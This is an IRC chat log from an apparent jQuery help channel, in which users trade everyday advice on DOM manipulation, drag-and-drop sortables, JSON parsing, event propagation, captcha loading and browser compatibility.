[11:22:08] <starsinmypockets> chrisinajar - your suggestion then is to simply remove the linebreaks from the html?
[11:22:25] <chrisinajar> starsinmypockets: mostly the whitespace
[11:22:52] <chrisinajar> starsinmypockets: it's pointless since it doesn't appear anywhere but in your js code, and it's only making it look crappy, so why have it there?
[11:23:15] <chrisinajar> code readability = important. makes it easier to find lines you're looking for.
[11:23:18] <WebDragon> hey sonuloveu
[11:23:20] <starsinmypockets> chrisinajar - well, I was just hoping for some readbility but yeah, whatev
[11:23:37] <WebDragon> I guess what he's saying is that it could be more readable in a completely different way
[11:25:23] <xec-> starsinmypockets: the html doesnt look valid btw - <li> is only valid in <ol> or <ul>
[11:25:24] <someprimetime> oksushi and Eviltwin what are your opinions of bootstrap?
[11:25:32] <someprimetime> from a css/jquery perspective
[11:26:30] <WebDragon> my personal opinion is that it's usually easier to have the markup in the document marked with display: none; and then add your manipulated content via jquery to the specific elements
[11:26:39] <WebDragon> and then make it display: block; or whatever
[11:27:05] <WebDragon> normally I use html within jquery only for inserting a line or a single element
[11:27:14] <WebDragon> neater that way
[11:28:05] <chrisinajar> agreed
[11:28:43] <chrisinajar> also, when i create dom elements in code i usually use myThing.append($("<div />", { class: "someClass", ...}));
[11:28:57] <chrisinajar> that's purely a stylistic thing, i just like the way it looks
[11:29:10] <chrisinajar> with a newline after the { and between each attribute
[11:29:12] <xec-> WebDragon: yeah, there are exceptions though, like if you're creating a plugin and/or dont want to depend on markup
[11:29:15] <someprimetime> for some reason in IE 8, that way of creating element wrappers @chrisinajar didn't work for me
[11:29:17] <someprimetime> just FYI
[11:29:37] <chrisinajar> it works fine in IE7,8,and 9, chrome, ff, and safari
[11:29:41] <chrisinajar> that's what i've tested it in
[11:29:44] <someprimetime> it seemed that var $whatever = ('<div class="foo" />'); worked instead
[11:29:47] <someprimetime> nice
[11:29:47] <chrisinajar> rather, the QA team has tested it in
[11:31:53] <starsinmypockets> Webdragon - that makes sense. Not sure if that works in this case since I want to be able to continue adding form elements indefinitely..
[11:35:07] <xec-> ?clone @ starsinmypockets

[11:36:57] <anoob_> I have a collection (is it the right term?) of dom elements... col[0] returns a dom element, are there any way to get an element from a collection as a jquery object, no dom element?
[11:37:28] <jeffsmykil> anyone know if when you are using $.when and the first function returns something if it will return it to the .then?
[11:37:44] <WebDragon> starsinmypockets: no reason you can't do that in a loop
[11:44:31] <muhoo> what call do i use to decode/encode json in jquery?
[11:44:35] <poppiez> anyone else having problems with the jquery animate complete callback firing before the animation is done?

[11:46:23] <khinester> hello, can someone tell me how to make the 'explode' effect like on the http://www.tiddlywiki.com when you click on an element
[11:48:19] <ajm_> muhoo look eval, $.getJSON(url,function) and JSON.parse and JSON.stringify()
[11:48:58] <jscheel> hi guys, is there a way to prevent stray events from firing when dragging a draggable too fast? It seems that as I drag the draggable around, the browser has to catch up ever so slightly at the redraw, so it will occasionally change what element my cursor is actually over
[11:49:00] <K3|Chris> khinester: what element?
[11:49:30] <muhoo> ajm_: thanks
[11:49:38] <jscheel> I guess the issue it mouse trailing
[11:49:43] <ajm_> muhoo also look at http://code.google.com/p/json-sans-eval/
[11:50:42] <muhoo> thanks, more secure == good
[11:51:08] <ajm_> muhoo but if it is under your control, it is one of the only appropriate uses of eval
[11:51:30] <MoTiOnXml> i'm wondering if it's possible to keep jQuery.ajax from sending cookies with the request
[11:51:34] <MoTiOnXml> anyone on this?
[11:51:43] <MoTiOnXml> (the docs + google doesn't seem to help on this=
[11:52:54] <ajm_> MoTiOnXml you could send to a cookieless subdomain, possibly
[11:53:13] <MoTiOnXml> ajm_: yea, i'm having some issues with jsonP
[11:53:37] <ajm_> what issues?
[11:53:53] <MoTiOnXml> ajm_: it's with asp.net forms authentication and WCF
[11:54:17] <ajm_> no idea
[11:54:50] <spersaud> I am trying to set hrefs in a dropdown menu ..
[11:55:08] <chrisinajar> do it
[11:55:45] <jeffsmykil> can you put a single ajax call in when?
[11:56:00] <chrisinajar> in when what
[11:56:02] <chrisinajar> and probably
[11:56:08] <spersaud> worked before, but now the a hrefs are in simple dropdown menu ...
[11:56:18] <jscheel> any ideas guys? is there a way to capture events so that mouse trailing during a drag doesn't fire off incorrect events all over the place/
[11:56:26] <mordof> trying to get jquery ui sortable and selectable working together - anyone have experience with this?
[11:56:32] <MoTiOnXml> ajm_: so no way to keep jquery from sending cookies with jsonp calls?
[11:56:34] <spersaud> http://css-tricks.com/examples/SimplejQueryDropdowns/
[11:56:41] <spersaud> which is a dropdown menu from that site
[11:56:49] <chrisinajar> jscheel: don't set up blanket events that get called when you drag
[11:57:24] <jscheel> chrisinajar: ? I have a mouseout event on an area that can accept drags. I need to check some collisions etc, during every drag tick
[11:57:44] <chrisinajar> but you *don't* want them to go off?
[11:57:47] * chrisinajar confused
[11:58:34] <jscheel> chrisinajar: I want them to fire when I actually exit the area, not when redraw doesn't catch up fast enough
[11:58:40] <chrisinajar> spersaud: so what's actually going wrong?
[11:59:07] <chrisinajar> "redraw doesn't catch up fast enough" meaning?
[11:59:25] <jscheel> chrisinajar: so, what happens is that the dragging element doesn't keep up perfectly with the mouse, so mouseenter and mouseleave events are fired on the element I am currently dragging over
[11:59:38] <chrisinajar> ok
[12:00:05] <someprimetime> is jsfiddle crapping out for anyone else with now?
[12:00:28] <chrisinajar> mousedown(function() { $(this).data('isDragging', true); }); .. mouseout(function() { if ($(this).data('isDragging')) return; .. });
[12:00:40] <chrisinajar> jscheel: do something like that to state track --^
[12:00:57] <chrisinajar> i still don't know why you have those mouseout events though
[12:01:11] <jscheel> chrisinajar: aaahh thanks
[12:01:44] <jscheel> chrisinajar: heh, it's part of a larger system where I am moving items around to make room for manually created placeholders and dynamic dropzones
[12:01:50] <jscheel> chrisinajar: there's a lot going on
[12:02:07] <chrisinajar> i would guess that your mouseout event is not the best way to do it
[12:02:12] <chrisinajar> but i also don't know your system well
[12:02:16] <chrisinajar> that's the vibe i get, though
[12:02:32] <spersaud> chrisinajar: ... I used a # to write comment in function ... works now ...
[12:02:51] <spersaud> how can I dynamically set teh height of a content ?
[12:03:52] <spersaud> ie you set div height to 600px ... but then you want it to stretch if the content is more than 600px
[12:03:55] <spersaud> any ideas ?
[12:04:06] <ajm_> spersaud, that is automatic if you have no height
[12:04:12] <jscheel> chrisinajar: well, I have multiple regions that have multiple dropzones that are dynamically injected based on the location of your dragging element relative to the location of other elements in the region. But, if you drag your dragging element back out of that region, it needs to destroy all of the dynamic dropzones it created
[12:04:33] <jscheel> so the region has a mouseout
[12:04:40] <khinester> K3|Chris: when you click on any of the menu items, you get an oppening effect and then if you close it you get a closing effect
[12:04:47] <ajm_> spersaud try instead setting the margins and padding and do not set the height.  otherweise you'll have to fire an event that manually adjusts it
[12:05:58] <Nomikos> I'm having a maddening issue with drag&drop sortable, the items drag fine, but sometimes the rest of the list scoots all over the page and messes up the layout
[12:06:23] <Nomikos> Has anyone seen this/know cause/fix?
[12:07:18] <mordof> Nomikos: link?
[12:07:26] <Nomikos> mordof: http://82.73.91.238:82/config/temp.php
[12:08:06] <Nomikos> It happens in Firefox/OS X for me, if that makes a difference
[12:08:23] <mordof> Nomikos: why are you using divs?
[12:08:46] <TimRiker> is datatables discussed here? I have a table that I'd like to hide/show columns in. When I re-fill the table client side, I loose the column sorting etc. Is there a way to reset datatables on the table without reloading the data from the server?
[12:08:48] <Nomikos> mordof: well, to see if it would improve from ul/li, the same thing was happening with those
[12:09:03] <mordof> Nomikos: ah, ok
[12:09:42] <Nomikos> mordof: I'm pretty sure it's /something/ in the style, but I absolutely suck at CSS
[12:10:31] <TimRiker> ah. /me finds http://datatables.net/release-datatables/examples/api/show_hide.html and reads some more.
[12:10:31] <mordof> Nomikos: sortable is creating new elements every time the mouse moves
[12:10:36] <mordof> Nomikos: that's what is pushing them all over the place
[12:11:03] <Nomikos> mordof: I did notice a bunch of extra html in source-of-selection, yeah.. but my JS isn't doing that, afaics
[12:11:13] <Nomikos> unless I'm somehow including more than I know about..
[12:11:24] <mordof> i'm checking your js now
[12:13:04] <ajm_> Nomikos it has to do with placeholder http://jqueryui.com/demos/sortable/placeholder.html
[12:13:40] <mordof> ajm_: how do you figure?
[12:13:46] <student1> if my string is "this is a name" , with javascript how can i retrieve the first word only?
[12:13:55] <mordof> ajm_: he's not using a placeholder, nor does sortable *require* a placeholder
[12:14:08] <Nomikos> student1: str.split(' ')[0]; I think
[12:14:24] <ajm_> mordof every dragged pixel inserting a new ui-sortable-placeholder element
[12:14:30] <student1> Nomikos, thanks, thats it, i was doing like substring and ....
[12:14:41] <xec-> ?eval "this is a string".split(' ')[0]
[12:14:42] <bot-t> xec-: "this"
[12:14:45] <Nomikos> student1: that is another way, neither is better
[12:15:02] <mordof> ajm_: i suppose that's some fairly sound logic there >.> lol
[12:15:36] <mordof> yay for making myself look like an idiot, woo!
[12:15:38] <Nomikos> ajm_: any idea what is causing it?
[12:15:38] * mordof shrugs
[12:16:14] <jeffsmykil> is there a way to trigger the back button via javascript?
[12:17:31] <mordof> ajm_: it shouldn't be spawning more than one of them though, that's the odd part
[12:19:30] <ajm_> mordof Nomikos im not sure, i think the best place to start is to define the placeholder style.  it could be the way that you're using <div><a></a></div> instead of <ul><li></li></ul>
[12:20:29] <Nomikos> ajm_: yeah, it was ul/li before and also happened there. I changed it to divs to see if that would somehow fix it.
[12:20:47] <Nomikos> I guess I'll just keep stripping stuff to see when it stops happening
[12:22:22] <mordof> Nomikos: try it on a completely empty page with just a couple test items to see that it's working propler
[12:22:25] <mordof> properly*
[12:22:52] <ajm_> hmm, may also be float:left causing weirdness
[12:23:09] <ajm_> i can't tell though because i refreshed and the page has changed
[12:24:13] <TimRiker> http://datatables.net/release-datatables/examples/api/show_hide.html  needs a bRetrieve attribute, no?

[12:32:17] <LekeFly> jQuery(this).next('.toggle').slideDown("fast");  this applyes to "next" div now right? how can i get it to apply to a div with a spesifict name
[12:34:14] <LekeFly> Anyone that could help me with a few jQuery problems for a few $?
[12:34:27] <student1> $('input#myid').val("asdf"); anyhing visibly worng with that?
[12:35:22] <NoiseEee> personally i'd skip the "input" part of your selector, but nothing visibly wrong with that
[12:35:44] <Nomikos> ajm_: apparently it was caused by me having defined a function scrollTo()
[12:36:01] <student1> LekeFly, would making function for each div help?
[12:36:10] <Nomikos> When I comment that out, it works as it should.. why would that happen

[12:37:42] <kenn> With ajax, I want to trigger fail callbacks when it IS 200 OK but the json is {"status":"error"}. How do I do that? the following answer didn't work for me: http://stackoverflow.com/questions/5489070/use-jquery-ajax-prefilter-to-inspect-response-data-and-conditionally-forward-to
[12:37:45] <student1> NoiseEee, cant figure out why it wouldnt work! $('#inputID').val("asdf");
[12:37:49] <DrShoggoth> Oh i see how that works
[12:37:51] <DrShoggoth> thanks
[12:37:57] <NoiseEee> student1: what does your console say?
[12:38:07] <student1> empty
[12:38:14] <NoiseEee> student1: sure you got a form input with that id?
[12:39:08] <student1> NoiseEee, yes,
[12:39:11] * Nomikos discovers scrollTo() is an existing JS function >.>
[12:39:30] <student1> it must be something silly on my part but been on the computer for hours, cant figure out
[12:39:58] <kenn> I tried to call jqXHR.reject() inside the prefilter but reject was undefined
[12:40:13] <NoiseEee> student1: yep.  jsfiddle/pastebin
[12:42:57] <mdunham918_> hey guys i have this plugin that utilizes $.modal() but i get undefined is not a function:  http://jsfiddle.net/LrsaE/
[12:43:07] <mdunham918_> jquery 1.5.2 loaded and jquery ui
[12:43:09] <student1> :( works on jsfiddle
[12:43:34] <mdunham918_> how do i get $.modal() to work?
[12:43:47] <student1> mdunham918_, you need to specifically add reference to the modal ui js files
[12:44:10] <mdunham918_> specially add reference? what do you mean
[12:44:21] <mdunham918_> you mean i'm not including a file properly or something
[12:45:33] <student1> could be,
[12:46:14] <gehsekky> hey all. using the latest jquery/jquery-ui, i'm using connected sortables on my page. even when i drop into a different connected sortable, ui.sender always returns as null.
[12:46:18] <student1> you need to refer to all the ui files, there is specifically smthg with the name of modal
[12:46:51] <student1> NoiseEee, figured out my problem, the value is being set, but sinces its display none, i cant directly see its new value in the dom
[12:46:53] <student1> strange
[12:56:31] <cezar> Any way to see what object is calling an event. I know somewhere I have an object calling the 'close' event. I just don't know what object.
[13:00:34] <chovy> cezar: this?
[13:00:53] <dabear> cezar: breakpoints..
[13:00:58] <cezar> chovy: I don't know the object.
[13:01:12] <chovy> what is the 'close' event?
[13:01:28] <cezar> The close event is the one triggered by bootstrap-alerts
[13:01:55] <cezar> I'm never receiving it, so I think I'm trying to catch it from the wrong object.
[13:02:47] <dabear> $(document).bind("close", function(ev){  use ev.target here })
[13:03:12] <dabear> ev.target will be element being triggered on
[13:03:30] <cezar> dabear: Excellent. Thanks.
[13:07:48] <LekeFly> Anyone that could help me with a few jQuery solutions for some $?
[13:08:00] <NoiseEee> solutions for some jquery?!
[13:08:54] <mordof> lol
[13:09:47] <LekeFly> NoiseEee: Problems solved with jQuery = jQuery solutions? :P
[13:14:10] <juha__> hah, my business cards have burning bus on them :D
[13:14:16] <ajm_> LekeFly just ask and if anybody knows the answer they will respond

[13:36:04] <cezar> Can someone tell me what the syntax in http://dpaste.com/696204/ does? What does $parent get set to?
[13:37:44] <denom> does jquery .ajax() support a message body for GET requests?
[13:38:01] <denom> I can't seem to get it to work in 1.7
[13:38:30] <chovy> cezar: that just declares $parent
[13:38:51] <chovy> assuming it ends with a , or ;
[13:39:23] <cezar> chovy: Thanks. It doesn't, but I don't think many of the lines in this file do.
[13:40:15] <nFFF> kzim
[13:40:19] <nFFF> What are you trying to do
[13:40:22] <chovy> var foo, bar, baz; just declares those vars.
[13:40:24] <nFFF> Your code is bolloxed
[13:41:23] <NoiseEee> Kzim: fix mine to suit your needs  http://jsfiddle.net/s3XMY/3/
[13:41:38] <denom> ahh may be a bug in my code
[13:41:56] <NoiseEee> Kzim: in other words, your selector is correct, but your use of it is not
[13:41:57] <populuxe> Is anybody noticing Array.isArray acting oddly in Firefox 10?
[13:43:00] <denom> gah, it does not work...
[13:47:13] <mllie> hello
[13:48:18] <nFFF> hey
[13:48:23] <mllie> If I want to find all ul:s with a specific class and check the count of li:s inside there. If more than 2, then wrap all except the 2 last ones in a div. How would that look like?
[13:48:42] <NoiseEee> mllie: break it into steps
[13:49:02] <K3|Chris> mllie: first part is easy
[13:49:31] <K3|Chris> mllie: want help with that part? I know how
[13:50:51] <Kzim> nFFF: it work like i want in your exemple. but not mine i don't know why but with your code i will be able to find the problem i think thx !
[13:51:56] <nFFF> kzim your welcome, but it was NoiseEee code :>>
[13:52:07] <mllie> NoiseEee: yeah. I guess like this: http://jsfiddle.net/7zbfJ/
[13:52:13] <cezar> What is the expected behavior when I do $('#') ?
[13:52:24] <mllie> NoiseEee: but then?
[13:52:24] <mordof> cezar: it searches for an ID in the DOM
[13:52:28] <Kzim> nFFF: oops
[13:52:29] <Kzim> NoiseEee: thanks
[13:52:36] <NoiseEee> np Kzim
[13:52:36] <mordof> cezar: $("#elementidgoeshere")
[13:53:34] <cezar> mordof: That's what I thought. I'm finding some messed up jquery in twitter's bootstrap-alert.js
[13:53:51] <nFFF> mllie
[13:53:52] <nFFF> http://jsfiddle.net/bDCXY/
[13:54:20] <mllie> nFFF: yeah, that is what I did. But how do I wrap now then?
[13:54:32] <mordof> cezar: heh
[13:54:55] <mordof> cezar: there are some things that are done for some obscure reasons, but have a very good purpose
[13:58:46] <NivenHuH> is there an event that gets triggered when you add an element to the dom?
[14:00:59] <K3|Chris> could someone point me towards a good way to wrap every 15 lis in a div?
[14:01:16] <K3|Chris> php outputs lis, layout needs them to be groups
[14:02:13] <Raydiation> i have 2 gradients, can i switch them with an effect that the colors fade to the new color?
[14:02:27] <nFFF> mllie
[14:02:42] <Raydiation> for instance orange to red goes through all colors between orange and red until it gets red
[14:02:42] <nFFF> http://jsfiddle.net/bDCXY/1/
[14:02:45] <nFFF> This doesn't work
[14:02:52] <nFFF> But the psuedo code is correct
[14:02:59] <nFFF> I don't know jquery syntax enough
[14:03:40] <K3|Chris> Raydiation: place them on top of each other and fade top one's opacity?
[14:03:55] <Raydiation> K3|Chris: good idea ty
[14:04:05] <K3|Chris> only works if they're opaque though
[14:04:57] <Proteus^> anybody here use aptana studio know how to make it not stop processing jslint errors if it contains to many?  you can do this with a comment at the top but i'd like to avoid having to put that at the top of every js file.
[14:06:20] <nova> im having come trouble with adding a click to a parent DIV, when the divs inside are clicked it registers it as the parent div being clicked, which i dont want, i just want it to get the click when its outside of the DIVs inside
[14:07:38] <nFFF> nova jsfiddle.net
[14:08:39] <nFFF> mllie http://jsfiddle.net/bDCXY/2/
[14:11:30] <nova> nFFF thanks but i finally found it — e.stopPropagation(); on '.parent div'
[14:11:40] <nova> if you get what i mean :P
[14:11:43] <nova> phew..
[14:13:14] <joshualibrarian> I finally get the whole thing done and debugged and working great... and under IE, most of the page doesn't even show, and as far as I can tell, no errors on the console.  Leads anyone?  http://freedoment.com/goldenleaf/portfolio.html
[14:13:18] <joshualibrarian> works great in firefox and chrome.
[14:16:16] <andrew9183> anyone working on some interesting jquery projects ?
[14:20:02] <xec-> joshualibrarian: validate your html
[14:20:40] <xec-> joshualibrarian: any reason you're using xhtml btw?
[14:22:39] <joshualibrarian> sec:  er... no, probably not... someone else created the file initially, I didn't really mess with that bit.
[14:23:29] <joshualibrarian> xec: which should I be using?
[14:24:02] <xec-> joshualibrarian: i'd recommend just <!DOCTYPE html>
[14:25:39] <joshualibrarian> xec:  well okay, still works in all three, but still fails almost completely in IE.
[14:25:48] <xec-> joshualibrarian: you can validate at: http://validator.w3.org/
[14:26:16] <xec-> theres a couple nasty errors there, dunno if they are what ie is throwing a hissy fit over
[14:27:53] <K3|Chris> better to play it safe, if IE is acting strange sometimes fixing validation solves it along the way
[14:28:40] <K3|Chris> quite frankly if your page doesn't validate and the errors aren't trivial like missing alt tags etc it's an error that it's displaying as you intend it to...
[14:29:02] <sorahn> what's the most likely cause of this kind of error "TypeError: 'undefined' is not an object"
[14:30:03] <xec-> sorahn: a bug!
[14:30:05] <innociv> Um.
[14:30:13] <innociv> How am I supposed to do captcha with jquery?
[14:30:30] <innociv> I've seen some with client side tests, but no server validation that the test was completed, which is mind numbingly stupid.
[14:30:33] <NoiseEee> sorahn: trying to do something on an object that doesn't exist
[14:30:38] <K3|Chris> why not just slot in uncapcha ?
[14:31:13] <sorahn> NoiseEee: I'm using jquery mobile, and i'm trying to use the $.mobile object, which i KNOW exists, because the actual page markup from jquery mobile is there, but i keep getting that error.
[14:31:17] <sorahn> :(
[14:31:17] <innociv> That'll work when the form is ajax?
[14:31:43] <nineserr> hi
[14:31:55] <innociv> And do you mean recaptcha?
[14:32:56] <nineserr> someone can help me?
[14:33:25] <innociv> https://github.com/brettp/uncaptcha ... another client side trick?  How does that stop a bot from just going directly to the registratoin post?
[14:33:27] <xec-> nineserr: we don't know yet - we would need to know what you need help with...
[14:33:49] <nineserr> I have a response from the server like this: ({"elementName":"fdgg", "elementId":"17", "fichero":"1328059247", "extension":"mp3"}) . How can I get the values with jQuery?
[14:34:05] <nineserr> it´s very simple but I´m starting
[14:34:48] <xec-> nineserr: are you seeing that in the browser, or what do you mean by "have a response"? are you doing an ajax request?
[14:36:57] <nineserr> it´s the string returned by the server for a request URL, it´s the string for the ajax query
[14:37:13] <nineserr> sorry for my english
[14:37:52] <dogmatic69> hi all,  is there a way to 'click' a button like this? http://bin.cakephp.org/view/487311746
[14:38:01] <xec-> nineserr: you can look at the examples here: http://api.jquery.com/jQuery.get/
[14:38:24] <xec-> nineserr: i assume you are getting JSON from the server (and not in parentheses like you pasted in channel)
[14:38:30] <dogmatic69> I am trying to bind ctrl+s to submit the form, there are a number of other buttons on the page too
[14:38:52] <xec-> nineserr: and in that case you could use http://api.jquery.com/jQuery.getJSON/
[14:39:52] <xec-> dogmatic69: you could just do <button accesskey="s">
[14:41:15] <dogmatic69> xec: that is alt+s, not ctrl+s
[14:41:40] <xec-> dogmatic69: dependant on browser, yes
[14:42:06] <dogmatic69> ye, doing it with jquery is browser independent pretty much
[14:43:13] <nFFF> xec, if transport.text is the hmtl from a js object returned from an ajax request. How do I add a class do every div inside it? $(transport.text).('div').each(function(){ $(this).addClass('foo'); });
[14:43:25] <nFFF> Doesnt appear to work
[14:43:29] <xec-> every browser supports accesskeys, and ctrl+s doesnt automatically mean "save" or "submit" to user. using accesskey makes sure the browser is allowed to handle what key combination is needed
[14:45:02] <nineserrr> hi
[14:45:31] <nineserrr> I was disconnected

[14:50:55] <starsinmypockets> I'm using .clone() to load some additional form elements... how can I act on the returned elements (ie change their name attr, class, etc) before insertion?

[14:53:17] <OhMyGoshJosh> can anyone recommend a good jquery alerts library?
[14:53:23] <OhMyGoshJosh> jAlert is okay, but not amazing
[14:54:00] <Es0teric> i have this -> http://jsfiddle.net/seBfE/5/ and when i press the delete key, it goes back one page… how do i stop that?
[14:55:15] <dogmatic69> xec-: found out how, pretty simple $(':button[value="save"]').click();
[14:55:36] <OhMyGoshJosh> @Es0teric: wondering if that's a bug in jsfiddle.  does it do that outside jsfiddle?
[14:55:45] <Es0teric> OhMyGoshJosh, yes it does
[14:56:00] <OhMyGoshJosh> @Es0teric: in general, you probably just need to capture the key for backspace while that textbox is focused and do nothing
[14:56:31] <OhMyGoshJosh> yeah, try capturing the onKeyDown event for the backspace key in particular...I forget how to do it in code w/o looking it up, though
[14:57:00] <dsada> Hi there, this probably an awfully daft question - but why is the function run first here http://jsfiddle.net/6WFF9/4/ ?
[14:57:05] <Es0teric> OhMyGoshJosh, i'll get the keycode for backspace.. but how do i do that in the onkeydown event?
[14:57:39] <joshualibrarian> sec: ah, thank you, the validator found the problems... :)
[14:57:42] <xec-> nFFF: http://jsfiddle.net/PjGFu/
[14:57:59] <xec-> joshualibrarian: np, glad you got it sorted :)
[14:59:20] <xec-> dogmatic69: that code won't listen to ctrl+s ? did I misunderstand what you needed?
[14:59:51] <dogmatic69> <dogmatic69> hi all,  is there a way to 'click' a button....
[14:59:53] <nFFF> xec-, Im perplexed as your using a selector
[14:59:59] <dogmatic69> I had the ctrl+s part
[15:00:18] <nFFF> IS there no way to search a variable in jQuery without a selector?
[15:00:50] <nFFF> Your basically placing the html inside an element and then using that element as a selector right?
[15:01:05] <xec-> nFFF: i'm letting the browser do the parsing. i suggest you do the same, but you don't have to display it
[15:01:52] <nFFF> Shit didnt even think of doing that
[15:02:06] <nFFF> For some reason I had it in my head to add class before it was passed to the DOM
[15:02:11] <nFFF> as the only way
[15:03:14] <xec-> nFFF: of course, that fiddle i made is far from optimal, just wanted to demonstrate whats happening
[15:04:59] <nFFF> Just in general though, whats the best way to searhc a variable in jQuery
[15:05:00] <padd173> Hi - Could someone please answer this question I have? http://stackoverflow.com/questions/9104672/why-are-both-squares-dragged-at-the-same-time
[15:05:12] <padd173> either on StackOverflow or here
[15:05:18] <nFFF> Everythig I've used is to just search the DOM via selectors
[15:05:38] <xec-> nFFF: search a variable? like .indexOf()?
[15:05:49] <dsada> Hi there, this probably an awfully daft question - but why is the function run first here http://jsfiddle.net/6WFF9/4/ ?
[15:05:50] <xec-> nFFF: sligthly better version: http://jsfiddle.net/PjGFu/1/
[15:06:07] <nFFF> I guess I mean is this valid jQuery(var).find('foo');
[15:06:48] <xec-> nFFF: assuming that var is a string of html, or a reference to a dom object (or jquery object) -- sure
[15:07:33] <xec-> nFFF: but read up on the difference between .filter() and .find()
[15:07:39] <nFFF> Ok thanks
[15:08:07] <nFFF> And whats the main benefit of placing the html on the DOM then editing vs editing the js object direct?
[15:08:37] <xec-> nFFF: jquery makes dom manipulation easy :)
[15:08:46] <NivenHuH> hey all, is there an event triggered when you add an element to the dom?
[15:09:05] <xec-> nFFF: of course, sometimes regex is much better
[15:09:41] <xec-> nFFF: but when manipulating html, its easier to use the browsers engine
[15:11:03] <padd173> Noone?

[15:19:23] <innociv> I dont' get this
[15:19:41] <innociv> If I try ajax loading php that outputs recaptcha, recaptcha makes this <noscript> thing
[15:22:53] <EyePulp> Under IE9 I seem to get nothing back for a .val() accessed like this:  dialog_form.find('input[name=tracking_number]').val()
[15:22:55] <misc--> hi... I have a bunch of checkboxes and I would like to know if any of them are checked. Here is one of the fields: <input name='practice[one][]' type=checkbox value=whatever>    <--- so I have a bunch of them exactly the same - I can do this: $("input[practice[one]]:checked").length     but it gives me ALL checked boxes even ones that aren't part of that array
[15:22:59] <EyePulp> under FF it works
[15:24:10] <OhMyGoshJosh> misc--: you could try scoping your jquery selector better, so something like $(".myCheckboxes input[practice[one]]"...
[15:24:35] <OhMyGoshJosh> Or alternatively, you could try using $.each() to iterative over all checkboxes, and then use some logic to detect nearby things
[15:24:49] <misc--> OhMyGoshJosh: ahhh ok, thank you I will give that a try
[15:26:12] <innociv> does jquery remove <script> tags from ajax?..
[15:30:07] <innociv> http://jsfiddle.net/ek4jG/1/ So uh.. Why does this just make jibberish?
[15:31:14] <acidjazz> so i have a table w/ tr's taht i have a hover event bound to.. but in the tr i have a div thats display: absolute and technically out of hte <tr> hover even so its initiating a blur/focus when i go over it.. any way i can stop this by any chance? i tried a stopPropagation hover bound to that div but that didnt work
[15:31:41] <innociv> http://jsfiddle.net/ek4jG/2/ nor this
[15:31:54] <chovy> innociv: that's the captcha.
[15:31:58] <chovy> j/k
[15:32:05] <innociv> Seriously.
[15:32:11] <chovy> maybe it's a js fiddle thing.
[15:33:21] <innociv> I can't get captchas to load via ajax elsewhere either.
[15:33:35] <innociv> Though it's not gibberish like that, it just cuts out the whole <script>
[15:34:41] <chovy> is it odd that <script> contains a document.write('<script>') ?
[15:34:56] <chovy> wouldn't that nest the tags?
[15:35:30] <innociv> dunno
[15:35:34] <innociv> might write it to the head of the page
[15:40:05] <someprimetime> am i using e.stopPropagation wrong here? http://jsfiddle.net/someprimetime/xB9b4/58/ in the Dropdown, if you click on Helpful, it closes out everytime
[15:40:26] <someprimetime> since i put a handler on the body, but within that drop down I have an e.stopPropagation()
[15:40:47] <someprimetime> nm
[15:40:56] <someprimetime> needed to put it in the $drop.click() instead
[15:54:50] <someprimetime> http://jsfiddle.net/someprimetime/xB9b4/61/ i'm using children() within $dropdown.find('li').click() and it seems it's getting all <a> elements on the page
[15:54:56] <someprimetime> is there an alternative i can use?
[15:55:18] <someprimetime> for an example, click on Popular within the Dropdown section and watch it change the text value in the first Primary Actions button
[15:55:44] <indspenceable> i have a form that disables submit buttons after you click them, except that in firefox, if you submit the form, then click back, the page keeps its old state, and the buttons stay disabled. It doesn't appear to run the $(function() {}) onload callbacks. is there a callback I can set to trigger in this situation?

[16:03:02] <chovy> innociv: maybe your api key is bad and it returns garbage
[16:03:03] <pace_t_zulu> even when i try samples i've found googling the problem
[16:03:21] <innociv> I got it using some javascript from google
[16:03:52] <Eviltwin> pace_t_zulu: Have you included this? https://github.com/jquery/jquery-tmpl
[16:04:19] <pace_t_zulu> Eviltwin: no
[16:04:31] <pace_t_zulu> Eviltwin: but i see the following message at that link: A templating plugin for jQuery. BETA. NO LONGER IN ACTIVE DEVELOPMENT OR MAINTENANCE. Issues remain open but are not being worked.
[16:04:37] <Eviltwin> ?.tmpl @ pace_t_zulu
[16:04:38] <bot-t1> pace_t_zulu, .tmpl() - Take the first element in the matched set and render its content as a template, using the specified data. http://api.jquery.com/tmpl/
[16:04:58] <PhonicUK> i swear there's a bug in jquerys selectors
[16:04:59] <Eviltwin> Note that it is in the Plugin category
[16:05:08] <Eviltwin> pace_t_zulu: What bug is that?
[16:05:09] <PhonicUK> sometimes i randomly see stuff in the wrong element :\
[16:05:27] <Eviltwin> It
[16:05:32] <PhonicUK> and its completely inconsistent :|
[16:05:34] <Eviltwin> 's probably your use of it
[16:05:34] <someprimetime> http://jsfiddle.net/someprimetime/xB9b4/62/ what's the best way to select the parent div class "sort" from inside $dropdown.find('li').click()?
[16:05:49] <someprimetime> i've been trying $(this).parentsUntil($sort) but to no avail
[16:05:56] <PhonicUK> Eviltwin, it's prettty unambiguous - in the particular case I'm seeing - I'm just using #elementId
[16:05:58] <PhonicUK> nothing else
[16:05:59] <pace_t_zulu> Eviltwin: is templating functionality actually supported by jquery?
[16:06:03] <Eviltwin> ?closest @ someprimetime
[16:06:03] <bot-t1> someprimetime, .closest(selector): Get the first element that matches the selector, beginning at the current element and progressing up through the DOM tree. http://api.jquery.com/closest/
[16:06:07] <acidjazz> i have a handler inside a div thats in a td inside of a tr.. how do i .parent() or whatever to get to that tr and do somethign to it?
[16:06:18] <someprimetime> Eviltwin: that didn't work for me for some reason
[16:06:18] <Eviltwin> pace_t_zulu: Not natively
[16:06:33] <Eviltwin> acidjazz: see ?closest
[16:06:33] <bot-t1> acidjazz, .closest(selector): Get the first element that matches the selector, beginning at the current element and progressing up through the DOM tree. http://api.jquery.com/closest/
[16:06:35] <someprimetime> woops
[16:06:36] <someprimetime> nm
[16:06:56] <pace_t_zulu> Eviltwin: so templating w jquery seems ill advised then
[16:06:59] <someprimetime> thanks Eviltwin
[16:07:00] <someprimetime> :)
[16:07:11] <acidjazz> Eviltwin: traci
[16:07:15] <acidjazz> err graci*
[16:14:08] <imsky> ffffaaaceebooookkkk
[16:18:24] <jarr0dsz> hey there
[16:18:26] <jarr0dsz> anyone alive around here?
[16:18:35] <jarr0dsz> could i use parent or first on something like document.forms['join'].submit(); ?
[16:27:24] <starsinmypockets> I am loading some form elements using .clone() however I need to act on them before they are rendered... add classes, change values... what is the proper way to do this?
[16:27:47] <chovy> starsinmypockets:
[16:27:55] <chovy> var htm = $("#foo").clone();
[16:27:57] <dogmatic69> it should be pretty instant
[16:28:25] <chovy> then you can do stuff like: htm.find("div").addClass('foo');
[16:29:05] <starsinmypockets> Actually, what it is, is that I am clong a div and need to act on a child element...
[16:29:26] <starsinmypockets> But yes, maybe it's simply my selectors or implementation has a problem...
